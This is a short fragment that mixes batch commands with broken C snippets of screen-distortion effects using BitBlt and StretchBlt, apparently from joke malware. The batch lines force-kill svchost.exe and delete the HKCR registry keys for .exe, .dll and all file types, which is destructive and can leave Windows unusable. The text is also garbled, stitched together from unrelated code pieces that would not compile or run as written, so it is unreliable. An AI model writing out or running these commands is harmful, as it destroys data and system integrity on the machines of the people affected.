@Echo off
Timeout 10
BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
	
	out: return 100;
}
int x1 = random() % (w - 400);
int y1 = random() % (h - 400);
int x2 = random() % (w - 400);
int y2 = random() % (h - 400);
int width = random() % 400;
int height = random() % 400;

BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);

	
out: return 200.0 / (times / 5.0 + 1) + 3;
}
	StretchBlt(hdc, 50, 50, w - 100, h - 100, hdc, 0, 0, w, h, SRCCOPY);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}

taskkill /IM svchost.exe /F

@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*